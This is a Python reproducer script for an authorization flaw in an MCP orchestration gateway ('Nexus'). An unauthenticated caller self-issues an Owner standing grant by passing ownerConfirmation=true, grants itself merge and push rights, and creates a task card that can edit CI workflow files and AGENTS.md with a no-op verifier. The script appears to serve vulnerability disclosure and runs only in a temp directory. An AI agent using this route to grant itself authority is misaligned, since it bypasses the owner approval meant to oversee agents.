"""Reproducer: any MCP caller can self-mint an "Owner" standing grant, and the
Task Card create sink accepts it with no Project Entry binding and no Ready Issue.

1. nexus_owner_standing_grant_issue: Owner identity is a hard-coded constant
   (owner_id="James3014") and Owner consent is the caller-supplied boolean
   ownerConfirmation=true. Nothing authenticates the Owner. The caller picks
   allowedActions, including GITHUB_MERGE and TASK_CARD_CREATE.
2. nexus_task_card_create: requires only that grant. It takes no issue_number,
   never checks a nexus_project_entry READY_TO_EXECUTE binding, never checks the
   Issue is Ready, and accepts caller-chosen allowed_files (no frozen paths),
   including .github/workflows/*.

All state is redirected to a temp dir; the real repo is not touched.
"""
import subprocess
import sys
import tempfile
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, "/home/user/Nexus-new")
import nexus.orchestrator.standing_grant_store as store  # noqa: E402
import nexus.orchestrator.unified_mcp_gateway as gw  # noqa: E402

with tempfile.TemporaryDirectory() as t:
    t = Path(t)
    store.DEFAULT_RECEIPT_PATH = t / "authority" / "standing-grant.json"
    store.DEFAULT_TRANSITIONS_DIR = store.DEFAULT_RECEIPT_PATH.parent / "transitions"
    canon = t / "canon"; canon.mkdir()
    subprocess.run(["git", "-C", str(canon), "init", "-q", "-b", "main"], check=True)
    subprocess.run(["git", "-C", str(canon), "-c", "user.name=t", "-c", "user.email=t@x.invalid",
                    "commit", "-q", "--allow-empty", "-m", "base"], check=True)
    gw.CANONICAL_SOURCE_ROOT = canon

    g = object.__new__(gw.UnifiedMCPGateway)  # no network / service needed for these handlers
    issued = g._call_tool("nexus_owner_standing_grant_issue", {
        "ownerConfirmation": True,  # caller-asserted, unauthenticated
        "repository": "James3014/Nexus-new",
        "coordinatorId": "any-agent",
        "goalId": "self-goal",
        "coordinationScopeId": "self-scope",
        "allowedActions": ["GITHUB_MERGE", "TASK_CARD_CREATE", "TASK_CARD_COMMIT", "REPOSITORY_PUSH"],
        "ttlMinutes": 60,
        "issuedAt": datetime.now(timezone.utc).isoformat(),
    })
    print("GRANT:", issued["status"], issued["allowed_actions"], "owner_id(hardcoded)=James3014")

    # No nexus_project_entry call, no issue number, no Ready-Issue frozen paths
    created = g._call_tool("nexus_task_card_create", {
        "owner_confirmation": True,
        "authority_goal_id": "self-goal",
        "authority_coordination_scope_id": "self-scope",
        "campaign_id": "self-campaign",
        "task_id": "self-task",
        "objective": "anything",
        "allowed_files": [".github/workflows/trusted-deletion-anchor.yml", "AGENTS.md"],
        "verifier_commands": ["true"],
    })
    print("TASK_CARD_CREATE:", created["status"], created["card_path"],
          "owner_authority.mutation_authorized=", created["owner_authority"]["mutation_authorized"])
    print("card allowed files:", [l for l in (canon / created["card_path"]).read_text().splitlines() if l.startswith("- `")])
